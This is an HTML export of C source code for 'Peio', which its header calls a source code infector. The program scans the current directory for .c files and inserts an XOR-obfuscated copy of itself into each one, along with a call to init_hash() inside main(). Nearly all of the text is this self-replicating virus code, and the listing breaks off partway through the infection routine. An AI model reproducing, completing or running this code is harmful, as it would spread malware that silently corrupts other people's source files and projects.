<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*
 * Peio,
 *    
 * source code infector XORing hashes.
 *                   zert &lt;zert@int80h.net&gt;
 *
 */</span><span class="sc0">

</span><span class="sc9">#include &lt;stdio.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;unistd.h&gt;
#include &lt;dirent.h&gt;
#include &lt;fcntl.h&gt;
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">init_hash</span><span class="sc10">();</span><span class="sc0"> 

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">argv</span><span class="sc10">[])</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">init_hash</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">init_hash</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mpos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ipos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">page</span><span class="sc10">,</span><span class="sc0"> 
    </span><span class="sc11">ihole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">thole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bhole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ehole</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dirent</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dir</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">DIR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">d</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ptr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">hashinc</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"£ιξγμυδε Όστδιο®θΎ£ιξγμυδε Όσωσ―στατ®θΎ£ιξγμυδε Όσωσ―νναξ®θΎ£ιξγμυδε Όυξιστδ®θΎ£ιξγμυδε Όδιςεξτ®θΎ£ιξγμυδε Όζγξτμ®θΎφοιδ ιξιτίθασθ¨©» "</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">hashbeg</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"φοιδ ιξιτίθασθ¨©ϋ‰ιξτ ι¬ κ¬ ζδ¬ σιϊε¬ νποσ¬ ιποσ¬ παηε¬ ‰ιθομε¬ τθομε¬ βθομε¬ εθομε» στςυγτ διςεξτ δις» ΔΙ δ»‰φοιδ πτς»‰γθας θασθιξγΫέ ½ Ά"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">hashend</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"‰γθας βυζ»‰δ ½ οπεξδις¨Ά®Ά©»‰χθιμε¨¨δις ½ ςεαδδις¨δ©©Ύ°©‰‰ιζ¨΅¨στςγνπ¨δις­Ύδίξανε«στςμεξ¨δις­Ύδίξανε©­²¬Ά®γΆ©©όό‰‰   ΅¨στςγνπ¨δις­Ύδίξανε«στςμεξ¨δις­Ύδίξανε©­²¬Ά®ΓΆ©©© ‰‰‰ιζ¨¨ζδ½οπεξ¨δις­Ύδίξανε¬ ΟίΔΧ¬ °©©Ύ½°©‰‰‰ϋ‰‰‰‰σιϊε ½ μσεελ¨ζδ¬ °¬ ΣΕΕΛίΕΞΔ©»‰‰‰‰πτς ½ νναπ¨ΞΥΜΜ¬σιϊε¬ΠΟΤίΕΑΔ¬ΝΑΠίΠΙΦΑΤΕ¬ζδ¬°©»‰‰‰‰ιζ¨ ¨΅στςστς¨πτς¬ΆιξιτίθασθΆ©© ¦¦‰‰‰‰  ¨ ¨¨νποσ½¨ιξτ©στςστς¨πτς¬Άάξναιξ¨Ά©©Ύ°© όό‰‰‰‰    ¨¨νποσ½¨ιξτ©στςστς¨πτς¬Άάξιξτ ναιξ¨Ά©©Ύ°© όό‰‰‰‰    ¨¨νποσ½¨ιξτ©στςστς¨πτς¬Άάξφοιδ ναιξ¨Ά©©Ύ°© όό ‰‰‰‰    ¨¨νποσ½¨ιξτ©στςστς¨πτς¬Άάξναιξ ¨Ά©©Ύ°© όό‰‰‰‰    ¨¨νποσ½¨ιξτ©στςστς¨πτς¬Άάξιξτ ναιξ ¨Ά©©Ύ°© όό‰‰‰‰    ¨¨νποσ½¨ιξτ©στςστς¨πτς¬Άάξφοιδ ναιξ ¨Ά©©Ύ°© © ©‰‰‰‰ϋ‰‰‰‰‰νποσ ½ ¨ιξτ©στςστς¨¨φοιδ ©νποσ¬ Ά»άξΆ©»‰‰‰‰‰νποσ ­½ ¨ιξτ©­­πτς»‰‰‰‰‰ιζ¨ ΅¨ιποσ ½ ¨ιξτ©στςστς¨««πτς¬ Ά£ιξγμυδε ΌΆ©© ©‰‰‰‰‰ϋ‰‰‰‰‰‰νυξναπ¨πτς¬ σιϊε©»‰‰‰‰‰‰βςεαλ»‰‰‰‰‰ύ‰‰‰‰‰νυξναπ¨πτς¬ σιϊε©»‰‰‰‰‰παηε ½ ³  ¨ιξτ©σωσγοξζ¨ίΣΓίΠΑΗΕΣΙΪΕ©»‰‰‰‰‰ζτςυξγατε¨ζδ¬ σιϊε«παηε©»‰‰‰‰‰πτς ½ νναπ¨ΞΥΜΜ¬σιϊε«παηε¬ΠΟΤίΕΑΔ«ΠΟΤίΧΙΤΕ¬ΝΑΠίΣΘΑΕΔ¬ζδ¬°©»‰‰‰‰‰ιποσ ½ ¨ιξτ©στςστς¨πτς¬ Ά£ιξγμυδε ΌΆ©»‰‰‰‰‰ιποσ ½ ¨ιξτ©στςστς¨¨φοιδ ©ιποσ¬ ΆάξάξΆ©»‰‰‰‰‰ιποσ ­½ ¨ιξτ©πτς»‰‰‰‰‰ζος¨ι½°»ιΌστςμεξ¨θασθιξγ©»ι««©‰‰‰‰‰‰θασθιξγΫιέ ή½ °ψΈ°»‰‰‰‰‰ζος¨ι½°»ιΌστςμεξ¨θασθβεη©»ι««©‰‰‰‰‰‰θασθβεηΫιέ ή½ °ψΈ°»‰‰‰‰‰ιθομε ½ στςμεξ¨θασθιξγ©»‰‰‰‰‰ζος¨ι½¨σιϊε­ιποσ©―ιθομε»ιΎ½°»ι­­© ‰‰‰‰‰‰νενγπω¨πτς«ιποσ«ιιθομε«ιθομε¬ πτς«ιποσ«ιιθομε¬ ιθομε©»‰‰‰‰‰νενγπω¨πτς«ιποσ¬ θασθιξγ¬ ιθομε©»‰‰‰‰‰ζος¨ι½°»ιΌστςμεξ¨θασθιξγ©»ι««©‰‰‰‰‰‰θασθιξγΫιέ ή½ °ψΈ°»‰‰‰‰‰νποσ «½ ιθομε»‰‰‰‰‰βυζ ½ ¨γθας ©ναμμογ¨²°σιϊεοζ¨γθας©©»‰‰‰‰‰στςγπω¨βυζ¬Άάξάτιξιτίθασθ¨©»Ά©»‰‰‰‰‰τθομε ½ στςμεξ¨βυζ©»‰‰‰‰‰ζος¨ι½¨σιϊε«ιθομε­νποσ©―τθομε»ιΎ½°»ι­­© ‰‰‰‰‰‰νενγπω¨πτς«νποσ«ιτθομε«τθομε¬ πτς«νποσ«ιτθομε¬ τθομε©»‰‰‰‰‰νενγπω¨πτς«νποσ¬ βυζ¬ τθομε©»‰‰‰‰‰βθομε ½ στςμεξ¨θασθβεη©»‰‰‰‰‰νενγπω¨πτς«σιϊε«ιθομε«τθομε¬ θασθβεη¬ βθομε©»‰‰‰‰‰νενγπω¨πτς«σιϊε«ιθομε«τθομε«βθομε¬ θασθιξγ¬ ιθομε©»‰‰‰‰‰βθομε «½ ιθομε»‰‰‰‰‰σπςιξτζ¨πτς«σιϊε«ιθομε«τθομε«βθομε¬ ΆάΆ»άξάτγθας θασθβεηΫέ ½ άΆΆ©»‰‰‰‰‰βθομε «½ ²²»‰‰‰‰‰ζος¨ι½°»ιΌστςμεξ¨θασθβεη©»ι««©‰‰‰‰‰‰θασθβεηΫιέ ή½ °ψΈ°»‰‰‰‰‰νενγπω¨πτς«σιϊε«ιθομε«τθομε«βθομε¬ θασθβεη¬ στςμεξ¨θασθβεη©©»‰‰‰‰‰βθομε «½ στςμεξ¨θασθβεη©»‰‰‰‰‰σπςιξτζ¨πτς«σιϊε«ιθομε«τθομε«βθομε¬ ΆάΆ»άξάτγθας θασθεξδΫέ ½ άΆΆ©»‰‰‰‰‰βθομε «½ ²²»‰‰‰‰‰νενγπω¨πτς«σιϊε«ιθομε«τθομε«βθομε¬ θασθεξδ¬ στςμεξ¨θασθεξδ©©»‰‰‰‰‰βθομε «½ στςμεξ¨θασθεξδ©»‰‰‰‰‰σπςιξτζ¨πτς«σιϊε«ιθομε«τθομε«βθομε¬ ΆάΆ»άξΆ©»‰‰‰‰‰βθομε «½ ³»‰‰‰‰‰ζος¨ι½°»ιΌστςμεξ¨θασθεξδ©»ι««©‰‰‰‰‰‰θασθεξδΫιέ ή½ °ψΈ°»‰‰‰‰‰εθομε ½ στςμεξ¨θασθεξδ©»‰‰‰‰‰νενγπω¨πτς«σιϊε«ιθομε«τθομε«βθομε¬ θασθεξδ¬ εθομε©»‰‰‰‰‰νσωξγ¨πτς¬ σιϊε«παηε¬ ΝΣίΣΩΞΓ©»‰‰‰‰‰νυξναπ¨πτς¬ σιϊε«παηε©»‰‰‰‰‰ζτςυξγατε¨ζδ¬ σιϊε«ιθομε«τθομε«βθομε«εθομε©»‰‰‰‰ύ εμσε‰‰‰‰ϋ‰‰‰‰‰νυξναπ¨πτς¬ σιϊε©»‰‰‰‰ύ‰‰‰ύύ"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">buf</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">d</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">opendir</span><span class="sc10">(</span><span class="sc6">"."</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">((</span><span class="sc11">dir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">readdir</span><span class="sc10">(</span><span class="sc11">d</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(!(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">+</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">)-</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc6">".c"</span><span class="sc10">))||</span><span class="sc0">
           </span><span class="sc10">!(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">+</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">)-</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc6">".C"</span><span class="sc10">)))</span><span class="sc0"> 
            </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">fd</span><span class="sc10">=</span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_RDWR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">))&gt;=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_END</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">ptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mmap</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">size</span><span class="sc10">,</span><span class="sc11">PROT_READ</span><span class="sc10">,</span><span class="sc11">MAP_PRIVATE</span><span class="sc10">,</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc6">"init_hash"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
                  </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">mpos</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc6">"\nmain("</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
                    </span><span class="sc10">((</span><span class="sc11">mpos</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc6">"\nint main("</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
                    </span><span class="sc10">((</span><span class="sc11">mpos</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc6">"\nvoid main("</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> 
                    </span><span class="sc10">((</span><span class="sc11">mpos</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc6">"\nmain ("</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
                    </span><span class="sc10">((</span><span class="sc11">mpos</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc6">"\nint main ("</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
                    </span><span class="sc10">((</span><span class="sc11">mpos</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc6">"\nvoid main ("</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">mpos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">((</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">mpos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">";\n"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">mpos</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)--</span><span class="sc11">ptr</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">!(</span><span class="sc11">ipos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(++</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"#include &lt;"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">munmap</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc11">munmap</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">page</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">sysconf</span><span class="sc10">(</span><span class="sc11">_SC_PAGESIZE</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">ftruncate</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">page</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">ptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mmap</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">page</span><span class="sc10">,</span><span class="sc11">PROT_READ</span><span class="sc10">+</span><span class="sc11">PROT_WRITE</span><span class="sc10">,</span><span class="sc11">MAP_SHARED</span><span class="sc10">,</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">ipos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"#include &lt;"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">ipos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">((</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">ipos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\n\n"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">ipos</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">ptr</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashinc</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                        </span><span class="sc11">hashinc</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">^=</span><span class="sc0"> </span><span class="sc4">0x80</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashbeg</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                        </span><span class="sc11">hashbeg</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">^=</span><span class="sc0"> </span><span class="sc4">0x80</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">ihole</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashinc</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=(</span><span class="sc11">size</span><span class="sc10">-</span><span class="sc11">ipos</span><span class="sc10">)/</span><span class="sc11">ihole</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&gt;=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">--)</span><span class="sc0"> 
                        </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">ipos</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">*</span><span class="sc11">ihole</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">ipos</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">*</span><span class="sc11">ihole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ihole</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">ipos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hashinc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ihole</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashinc</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                        </span><span class="sc11">hashinc</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">^=</span><span class="sc0"> </span><span class="sc4">0x80</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">mpos</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">ihole</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">buf</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc4">20</span><span class="sc10">*</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">));</span><span class="sc0">
                    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc6">"\n\tinit_hash();"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">thole</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=(</span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">-</span><span class="sc11">mpos</span><span class="sc10">)/</span><span class="sc11">thole</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&gt;=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">--)</span><span class="sc0"> 
                        </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">mpos</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">*</span><span class="sc11">thole</span><span class="sc10">+</span><span class="sc11">thole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">mpos</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">*</span><span class="sc11">thole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">thole</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">mpos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">thole</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">bhole</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashbeg</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">+</span><span class="sc11">thole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hashbeg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bhole</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">+</span><span class="sc11">thole</span><span class="sc10">+</span><span class="sc11">bhole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hashinc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ihole</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">bhole</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">ihole</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">+</span><span class="sc11">thole</span><span class="sc10">+</span><span class="sc11">bhole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\";\n\tchar hashbeg[] = \""</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">bhole</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">22</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashbeg</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                        </span><span class="sc11">hashbeg</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">^=</span><span class="sc0"> </span><span class="sc4">0x80</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">+</span><span class="sc11">thole</span><span class="sc10">+</span><span class="sc11">bhole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hashbeg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashbeg</span><span class="sc10">));</span><span class="sc0">
                    </span><span class="sc11">bhole</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashbeg</span><span class="sc10">);</span><span class="sc0">
